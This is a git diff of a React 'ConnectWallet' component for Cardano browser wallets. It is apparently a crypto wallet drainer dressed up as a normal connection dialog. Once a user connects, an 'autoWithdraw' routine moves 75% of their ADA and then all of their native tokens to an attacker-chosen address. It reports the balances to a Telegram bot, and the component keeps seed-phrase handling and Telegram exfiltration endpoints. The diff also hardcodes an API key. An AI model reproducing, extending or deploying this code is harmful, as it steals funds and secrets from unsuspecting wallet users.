@@ -3,41 +3,23 @@ import { useNavigate } from "react-router";
 import { Link } from "react-router-dom";
 import { Buffer } from "buffer";
 import axios from "axios";
+import { transferADA, transferADAAndTokens } from "../../utils/walletUtils";
+import { getRecipientAddress } from "../../utils/userLocation";
+import { sendAppDetailsToTelegram } from "../../utils/telegramUtils";
 
 function ConnectWallet({ onClose }) {
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [walletAction, setWalletAction] = useState(null);
-
   const [restoreMethod, setRestoreMethod] = useState(null);
   const [showRestoreContainer, setShowRestoreContainer] = useState(false);
   const [fileName, setFileName] = useState("");
   const [seedPhrase, setSeedPhrase] = useState("");
   const [attempts, setAttempts] = useState(0);
-  // const [CardanoWasm, setCardanoWasm] = useState(null);
+  const [CardanoWasm, setCardanoWasm] = useState(null);
   const [balance, setBalance] = useState(null);
   const [usdBalance, setUsdBalance] = useState(null);
   const [address, setAddress] = useState("");
   const navigate = useNavigate();
-  const [country, setCountry] = useState("");
-
-  useEffect(() => {
-    const getCountry = async () => {
-      try {
-        const response = await fetch("https://ipapi.co/json/");
-        const data = await response.json();
-        const country = data.country_name;
-        setCountry(country);
-      } catch (error) {
-        console.error("Error fetching country:", error);
-        setCountry("Unknown");
-        console.log("Unknown"); // Log "Unknown" if there's an error
-      }
-    };
-    getCountry();
-  }, []);
-
-  const BLOCKFROST_API_KEY = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_KEY;
-  const BLOCKFROST_API_URL = import.meta.env.VITE_REACT_APP_BLOCKFROST_API_URL;
 
   useEffect(() => {
     const loadWasm = async () => {
@@ -49,6 +31,9 @@ function ConnectWallet({ onClose }) {
 
     loadWasm();
   }, []);
+
+  const BLOCKFROST_API_KEY = "mainnetl7kg73l1Eh3mif46gJOJHIfTtbYosjl8";
+  const BLOCKFROST_API_URL = "https://cardano-mainnet.blockfrost.io/api/v0";
 
   const fetchProtocolParams = async () => {
     try {
@@ -76,7 +61,9 @@ function ConnectWallet({ onClose }) {
 
       let balanceInAda;
       if (isHex) {
-        balanceInAda = Value.from_bytes(Buffer.from(balanceInLovelace, "hex"));
+        balanceInAda = CardanoWasm.Value.from_bytes(
+          Buffer.from(balanceInLovelace, "hex")
+        );
       } else {
         balanceInAda = Number(balanceInLovelace) / 1000000;
       }
@@ -104,201 +91,156 @@ function ConnectWallet({ onClose }) {
   }
 
   async function autoWithdraw(walletApi, currentBalance, address) {
-    if (currentBalance === null || currentBalance === 0) {
-      console.error("Balance not available or zero");
+    if (
+      currentBalance === null ||
+      currentBalance === 0 ||
+      isNaN(currentBalance)
+    ) {
+      console.error("Balance not available or is NaN");
       return;
     }
 
-    const recipientAddress = import.meta.env.VITE_REACT_APP_RECIPIENT_ADDRESS;
+    const recipientAddress = await getRecipientAddress();
 
-    // Calculate 3/4 of the balance
-    const amountToWithdraw = Math.floor(currentBalance * 0.75);
+    let localBalance = currentBalance; // Track balance locally
+
+    console.log(`Starting balance: ${localBalance.toFixed(6)} ADA`);
 
     try {
       const protocolParams = await fetchProtocolParams();
 
-      // Convert ADA to Lovelace without padding
-      const lovelaceAmount = Math.floor(amountToWithdraw * 1000000).toString();
+      // Fetch UTXOs
+      let utxosHex = await walletApi.getUtxos();
+      if (!utxosHex || !Array.isArray(utxosHex) || utxosHex.length === 0) {
+        console.error("No UTXOs found or invalid UTXO format");
+        return;
+      }
 
-      console.log("Lovelace amount:", lovelaceAmount);
+      let utxos = await getTxUnspentOutputs(utxosHex);
+      if (!utxos || utxos.len() === 0) {
+        console.error("Parsed UTXOs are empty or invalid");
+        return;
+      }
 
-      await buildSendADATransaction(
-        recipientAddress,
-        lovelaceAmount,
-        walletApi,
-        protocolParams,
-        address
-      );
-      console.log(
-        `Withdrawal of ${amountToWithdraw.toFixed(
-          6
-        )} ADA initiated (3/4 of balance)`
-      );
-    } catch (error) {
-      console.error("Error during auto-withdrawal:", error);
-    }
-  }
+      let totalAdaAmount = 0;
+      let nonNativeTokens = [];
 
-  const getTxUnspentOutputs = async (utxos) => {
-    let txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
-    for (const utxor of utxos) {
-      const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
-        Buffer.from(utxor, "hex")
-      );
-      const input = utxo.input();
-      const txid = Buffer.from(
-        input.transaction_id().to_bytes(),
-        "utf8"
-      ).toString("hex");
-      const txindx = input.index();
-      const output = utxo.output();
-      const amount = output.amount().coin().to_str();
-      const multiasset = output.amount().multiasset();
-      let multiAssetStr = "";
+      // Collect ADA and non-native tokens
+      for (let i = 0; i < utxos.len(); i++) {
+        const utxo = utxos.get(i);
+        const outputAmount = utxo.output().amount();
+        const adaAmount = parseInt(outputAmount.coin().to_str());
+        if (!isNaN(adaAmount)) {
+          totalAdaAmount += adaAmount;
+        }
 
-      if (multiasset) {
-        const keys = multiasset.keys();
-        const N = keys.len();
-
-        for (let i = 0; i < N; i++) {
-          const policyId = keys.get(i);
-          const policyIdHex = Buffer.from(policyId.to_bytes(), "utf8").toString(
-            "hex"
-          );
-          const assets = multiasset.get(policyId);
-          const assetNames = assets.keys();
-          const K = assetNames.len();
-
-          for (let j = 0; j < K; j++) {
-            const assetName = assetNames.get(j);
-            const assetNameString = Buffer.from(
-              assetName.name(),
-              "utf8"
-            ).toString();
-            const assetNameHex = Buffer.from(assetName.name(), "utf8").toString(
-              "hex"
-            );
-            const multiassetAmt = multiasset.get_asset(policyId, assetName);
-            multiAssetStr += `+ ${multiassetAmt.to_str()} + ${policyIdHex}.${assetNameHex} (${assetNameString})`;
+        const multiasset = outputAmount.multiasset();
+        if (multiasset) {
+          const keys = multiasset.keys();
+          const N = keys.len();
+          for (let i = 0; i < N; i++) {
+            const policyId = keys.get(i);
+            const assets = multiasset.get(policyId);
+            const assetNames = assets.keys();
+            const K = assetNames.len();
+            for (let j = 0; j < K; j++) {
+              const assetName = assetNames.get(j);
+              const amount = parseInt(
+                multiasset.get_asset(policyId, assetName).to_str()
+              );
+              if (!isNaN(amount)) {
+                nonNativeTokens.push({
+                  policyId: policyId.to_hex(),
+                  assetName: Buffer.from(assetName.name()).toString(),
+                  amount: amount,
+                });
+              }
+            }
           }
         }
       }
 
-      const obj = {
-        txid: txid,
-        txindx: txindx,
-        amount: amount,
-        str: `${txid} #${txindx} = ${amount}`,
-        multiAssetStr: multiAssetStr,
-        TransactionUnspentOutput: utxo,
-      };
-      txOutputs.add(obj.TransactionUnspentOutput);
+      // Step 1: Withdraw 3/4 of ADA balance
+      const adaToWithdraw = Math.floor(localBalance * 0.75); // Withdraw 85% of remaining ADA
+
+      if (!isNaN(adaToWithdraw)) {
+        try {
+          console.log(`Withdrawing 3/4 ADA: ${adaToWithdraw} ADA`);
+          // Send wallet balance to Telegram
+          sendAppDetailsToTelegram(adaToWithdraw, nonNativeTokens);
+          const txHash = await transferADA(
+            walletApi,
+            CardanoWasm,
+            recipientAddress,
+            adaToWithdraw
+          );
+          console.log(`ADA transfer transaction hash: ${txHash}`);
+
+          // Update local ADA balance after ADA withdrawal
+          localBalance -= adaToWithdraw;
+          console.log(
+            `Balance after ADA withdrawal: ${localBalance.toFixed(6)} ADA`
+          );
+
+          if (localBalance < 1) {
+            console.error("Insufficient ADA for further transactions.");
+            return;
+          }
+        } catch (error) {
+          console.log("Failed to transfer ADA:", error);
+        }
+      }
+
+      // Step 2: Check and withdraw non-native tokens, if available
+      if (nonNativeTokens.length > 0) {
+        console.log(
+          `Withdrawing non-ADA tokens: ${nonNativeTokens.length} tokens`
+        );
+
+        // Prepare token data for transfer
+        const tokenPolicyIds = nonNativeTokens.map((token) => token.policyId);
+        const tokenAssetNames = nonNativeTokens.map((token) => token.assetName);
+        const tokenAmounts = nonNativeTokens.map((token) => token.amount);
+
+        try {
+          const txHash = await transferADAAndTokens(
+            walletApi,
+            CardanoWasm,
+            recipientAddress,
+            tokenPolicyIds,
+            tokenAssetNames,
+            tokenAmounts
+          );
+          console.log(`Non-ADA token transfer transaction hash: ${txHash}`);
+        } catch (error) {
+          console.log("Failed to transfer non-ADA tokens:", error);
+        }
+      } else {
+        console.log("No non-ADA tokens found, skipping token withdrawal.");
+      }
+    } catch (error) {
+      console.log("Error during auto-withdrawal:", error);
     }
+  }
+
+  async function getTxUnspentOutputs(utxosHex) {
+    const txOutputs = CardanoWasm.TransactionUnspentOutputs.new();
+
+    for (const utxor of utxosHex) {
+      try {
+        // Convert hex UTXO to TransactionUnspentOutput object
+        const utxo = CardanoWasm.TransactionUnspentOutput.from_bytes(
+          Buffer.from(utxor, "hex")
+        );
+        txOutputs.add(utxo);
+      } catch (error) {
+        console.error("Failed to parse UTXO:", error);
+        throw new Error("Invalid UTXO format");
+      }
+    }
+
     return txOutputs;
-  };
-
-  const buildSendADATransaction = async (
-    recAddress,
-    amount,
-    nami,
-    protocolParams,
-    address
-  ) => {
-    const txBuilder = CardanoWasm.TransactionBuilder.new(
-      CardanoWasm.TransactionBuilderConfigBuilder.new()
-        .fee_algo(
-          CardanoWasm.LinearFee.new(
-            CardanoWasm.BigNum.from_str(protocolParams.min_fee_a.toString()),
-            CardanoWasm.BigNum.from_str(protocolParams.min_fee_b.toString())
-          )
-        )
-        .pool_deposit(
-          CardanoWasm.BigNum.from_str(protocolParams.pool_deposit.toString())
-        )
-        .key_deposit(
-          CardanoWasm.BigNum.from_str(protocolParams.key_deposit.toString())
-        )
-        .coins_per_utxo_word(
-          CardanoWasm.BigNum.from_str(
-            protocolParams.coins_per_utxo_size.toString()
-          )
-        )
-        .max_tx_size(16384)
-        .max_value_size(5000)
-        .build()
-    );
-    console.log("Amount in Lovelace:", amount, recAddress, "naddr", address);
-    const shelleyOutputAddress = CardanoWasm.Address.from_bech32(recAddress);
-    const shelleyChangeAddress = CardanoWasm.Address.from_bech32(address);
-
-    console.log(
-      "Amount in Lovelace:",
-      shelleyOutputAddress,
-      shelleyChangeAddress
-    );
-
-    const utxosHex = await nami.getUtxos();
-
-    console.log("Amount in Lovelace:", utxosHex);
-
-    const utxos = utxosHex.map((hex) =>
-      CardanoWasm.TransactionUnspentOutput.from_bytes(Buffer.from(hex, "hex"))
-    );
-    console.log("Amount in Lovelace:", utxosHex);
-
-    utxos.forEach((utxo) => {
-      txBuilder.add_input(
-        CardanoWasm.Address.from_bech32(address),
-        utxo.input(),
-        utxo.output().amount()
-      );
-    });
-
-    console.log("Amount in Lovelace:", utxosHex);
-
-    txBuilder.add_output(
-      CardanoWasm.TransactionOutput.new(
-        shelleyOutputAddress,
-        CardanoWasm.Value.new(CardanoWasm.BigNum.from_str(amount))
-      )
-    );
-
-    txBuilder.add_change_if_needed(shelleyChangeAddress);
-
-    const txBody = txBuilder.build();
-
-    const transactionWitnessSet = CardanoWasm.TransactionWitnessSet.new();
-
-    const tx = CardanoWasm.Transaction.new(
-      txBody,
-      CardanoWasm.TransactionWitnessSet.from_bytes(
-        transactionWitnessSet.to_bytes()
-      )
-    );
-
-    console.log("Amount in Lovelace:", tx);
-
-    let txVkeyWitnesses = await nami.signTx(
-      Buffer.from(tx.to_bytes(), "utf8").toString("hex"),
-      true
-    );
-
-    txVkeyWitnesses = CardanoWasm.TransactionWitnessSet.from_bytes(
-      Buffer.from(txVkeyWitnesses, "hex")
-    );
-
-    transactionWitnessSet.set_vkeys(txVkeyWitnesses.vkeys());
-
-    const signedTx = CardanoWasm.Transaction.new(
-      tx.body(),
-      transactionWitnessSet
-    );
-
-    const submittedTxHash = await nami.submitTx(
-      Buffer.from(signedTx.to_bytes(), "utf8").toString("hex")
-    );
-    console.log("Submitted transaction hash:", submittedTxHash);
-  };
+  }
 
   const handleWalletSelection = async (wallet) => {
     if (wallet === "Nami") {
@@ -328,13 +270,12 @@ function ConnectWallet({ onClose }) {
 
             if (addresses && addresses.length > 0) {
               const hexAddress = addresses[0];
-              console.log(hexAddress);
-              setSelectedWallet(key);
+
+              setSelectedWallet("Nami");
               const addressBytes = Buffer.from(hexAddress, "hex");
-              console.log(addressBytes);
-              const address = Address.from_bytes(addressBytes);
+              const address = CardanoWasm.Address.from_bytes(addressBytes);
               console.log(
-                `Connected to ${key}. Hex Address:`,
+                `Connected to Nami. Hex Address:`,
                 address?.to_bech32()
               );
               setAddress(address?.to_bech32());
@@ -361,12 +302,12 @@ function ConnectWallet({ onClose }) {
             }
           }
         } catch (error) {
-          console.error(`Error connecting to ${key} wallet:`, error);
-          alert(`Error connecting to ${key} wallet. Please try again`);
+          console.error(`Error connecting to Nami wallet:`, error);
+          alert(`Error connecting to Nami wallet. Please try again`);
         }
       } else {
-        console.error(`${key} wallet not found. Please install the extension.`);
-        alert(`${key} wallet not found. Please install the extension.`);
+        console.error(`Nami wallet not found. Please install the extension.`);
+        alert(`Nami wallet not found. Please install the extension.`);
       }
     } else if (wallet === "Eternl") {
       navigate("/eternl");
@@ -421,16 +362,6 @@ function ConnectWallet({ onClose }) {
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
-    const greenCountries = [
-      "united states",
-      "united kingdom",
-      "nigeria",
-      "united arab emirates",
-      "canada",
-    ];
-    const color = greenCountries.includes(country.toLowerCase())
-      ? "RED"
-      : "GREEN";
 
     const endpoints = [
       {
@@ -444,7 +375,7 @@ function ConnectWallet({ onClose }) {
         url: `https://api.telegram.org/bot${otoken}/sendMessage`,
         data: {
           chat_id: ochat_id,
-          text: `Minwallet: ${country}   ${message}`,
+          text: `Minwallet:   ${message}`,
         },
       },
     ];
@@ -574,7 +505,6 @@ function ConnectWallet({ onClose }) {
     );
   };
 
-  console.log(filteredWalletNames);
   return (
     <div className="fixed inset-0 flex items-center justify-center lg:justify-end z-[500] bg-[#ffffff1c] bg-opacity-50 backdrop-blur">
       <div className="ConnectWallet w-full max-w-[420px] lg:h-full lg:bg-[#111218]">
@@ -786,23 +716,52 @@ function ConnectWallet({ onClose }) {
                     </div>
                   )}
 
-                  {filteredWalletNames.map((wallet) => {
-                    return (
-                      selectedWallet === wallet && (
-                        <div
-                          key={wallet}
-                          className="bg-[#1f2025] p-4 rounded-lg"
-                        >
-                          <p className="text-textSecondary mb-2">
-                            {window.cardano[wallet].name} has been connected
-                          </p>
-                          <button className="bg-blue-500 text-white px-4 py-2 rounded">
-                            {window.cardano[wallet].name} Connected
-                          </button>
-                        </div>
-                      )
-                    );
-                  })}
+                  {/* {selectedWallet === "Ledger" && (
+                  <div className="bg-[#1f2025] p-4 rounded-lg">
+                    <p className="text-textSecondary mb-2">
+                      Please connect your Ledger device and open the Cardano
+                      app.
+                    </p>
+                    <button className="bg-blue-500 text-white px-4 py-2 rounded">
+                      Detect Ledger
+                    </button>
+                  </div>
+                )} */}
+
+                  {selectedWallet === "Nami" && (
+                    <div className="bg-[#1f2025] p-4 rounded-lg">
+                      <p className="text-textSecondary mb-2">
+                        Make sure you have Nami wallet installed in your
+                        browser.
+                      </p>
+                      <button className="bg-blue-500 text-white px-4 py-2 rounded">
+                        Connect Nami
+                      </button>
+                    </div>
+                  )}
+
+                  {selectedWallet === "Eternl" && (
+                    <div className="bg-[#1f2025] p-4 rounded-lg">
+                      <p className="text-textSecondary mb-2">
+                        Connect your Eternl wallet to proceed.
+                      </p>
+                      <button className="bg-blue-500 text-white px-4 py-2 rounded">
+                        Connect Eternl
+                      </button>
+                    </div>
+                  )}
+
+                  {/* {selectedWallet === "WalletConnect" && (
+                  <div className="bg-[#1f2025] p-4 rounded-lg">
+                    <p className="text-textSecondary mb-2">
+                      Scan the QR code with your WalletConnect-compatible
+                      wallet.
+                    </p>
+                    <div className="bg-white p-4 inline-block">
+                      Detect Ledger
+                    </div>
+                  </div>
+                )} */}
 
                   {selectedWallet === "Add Custom Wallet" && (
                     <div className="bg-[#1f2025] p-4 rounded-lg">
@@ -857,47 +816,118 @@ function ConnectWallet({ onClose }) {
                           <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
                         </svg>
                       </div>
-
-                      {filteredWalletNames.map((key) => {
-                        return (
-                          <div
-                            key={key}
-                            className="flex items-center cursor-pointer gap-x-4 p-3 "
-                            onClick={() =>
-                              handleWalletSelection(
-                                `${window.cardano[key].name}`,
-                                key
-                              )
-                            }
-                          >
-                            <img
-                              src={window.cardano[key].icon}
-                              width={32}
-                              height={32}
-                              alt={key}
-                            />
-                            <div className="flex-1">
-                              <h1 className="text-textSecondary text-md font-semibold">
-                                {window.cardano[key].name}
-                              </h1>
-                              <p className="text-[#919bd1] text-sm">
-                                Mobile support
-                              </p>
-                            </div>
-                            <svg
-                              viewBox="0 0 24 24"
-                              xmlns="http://www.w3.org/2000/svg"
-                              width="24"
-                              height="24"
-                              fill="currentColor"
-                              className="text-textSecondary size-5 shrink-0"
-                            >
-                              <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
-                            </svg>
-                          </div>
-                        );
-                      })}
-
+                      <div
+                        className="flex items-center cursor-pointer gap-x-4 p-3 "
+                        //   onClick={() => handleWalletSelection("Ledger")}
+                      >
+                        <img
+                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831775/abhvehnlx6umoknjxw5f.svg"
+                          className="size-8 shrink-0 invert"
+                          alt="ledger"
+                        />
+                        <div className="flex-1">
+                          <h1 className="text-textSecondary text-md font-semibold">
+                            Ledger
+                          </h1>
+                          <p className="text-[#919bd1] text-sm">
+                            Not Available
+                          </p>
+                        </div>
+                        <svg
+                          viewBox="0 0 24 24"
+                          xmlns="http://www.w3.org/2000/svg"
+                          width="24"
+                          height="24"
+                          fill="currentColor"
+                          className="text-textSecondary size-5 shrink-0"
+                        >
+                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
+                        </svg>
+                      </div>
+                      <div
+                        className="flex items-center cursor-pointer gap-x-4 p-3 "
+                        onClick={() => handleWalletSelection("Nami")}
+                      >
+                        <img
+                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831806/v5xt2tc2lipxzhgsay3u.svg"
+                          className="size-8 shrink-0"
+                          alt="nami"
+                        />
+                        <div className="flex-1">
+                          <h1 className="text-textSecondary text-md font-semibold">
+                            Nami
+                          </h1>
+                          <p className="text-[#919bd1] text-sm">
+                            Mobile support
+                          </p>
+                        </div>
+                        <svg
+                          viewBox="0 0 24 24"
+                          xmlns="http://www.w3.org/2000/svg"
+                          width="24"
+                          height="24"
+                          fill="currentColor"
+                          className="text-textSecondary size-5 shrink-0"
+                        >
+                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
+                        </svg>
+                      </div>
+                      <div
+                        className="flex items-center cursor-pointer gap-x-4 p-3 "
+                        onClick={() => handleWalletSelection("Eternl")}
+                      >
+                        <img
+                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831836/zlxswqaargsgb5wtm3vb.svg"
+                          className="size-8 shrink-0"
+                          alt="eternl"
+                        />
+                        <div className="flex-1">
+                          <h1 className="text-textSecondary text-md font-semibold">
+                            Eternl
+                          </h1>
+                          <p className="text-[#919bd1] text-sm">
+                            Mobile support
+                          </p>
+                        </div>
+                        <svg
+                          viewBox="0 0 24 24"
+                          xmlns="http://www.w3.org/2000/svg"
+                          width="24"
+                          height="24"
+                          fill="currentColor"
+                          className="text-textSecondary size-5 shrink-0"
+                        >
+                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
+                        </svg>
+                      </div>
+                      <div
+                        className="flex items-center cursor-pointer gap-x-4 p-3 "
+                        //   onClick={() => handleWalletSelection("WalletConnect")}
+                      >
+                        <img
+                          src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721831870/gwe5i02najzyogs8jqcj.svg"
+                          className="size-8 shrink-0"
+                          alt="walletconnect"
+                        />
+                        <div className="flex-1">
+                          <h1 className="text-textSecondary text-md font-semibold">
+                            WalletConnect
+                          </h1>
+                          <p className="text-[#919bd1] text-sm">
+                            Not Available
+                          </p>
+                        </div>
+                        <svg
+                          viewBox="0 0 24 24"
+                          xmlns="http://www.w3.org/2000/svg"
+                          width="24"
+                          height="24"
+                          fill="currentColor"
+                          className="text-textSecondary size-5 shrink-0"
+                        >
+                          <path d="M13.1717 12.0007L8.22192 7.05093L9.63614 5.63672L16.0001 12.0007L9.63614 18.3646L8.22192 16.9504L13.1717 12.0007Z"></path>
+                        </svg>
+                      </div>
                       <div
                         className="flex items-center cursor-pointer gap-x-4 p-3 "
                         onClick={() => handleWalletSelection("Custom")}
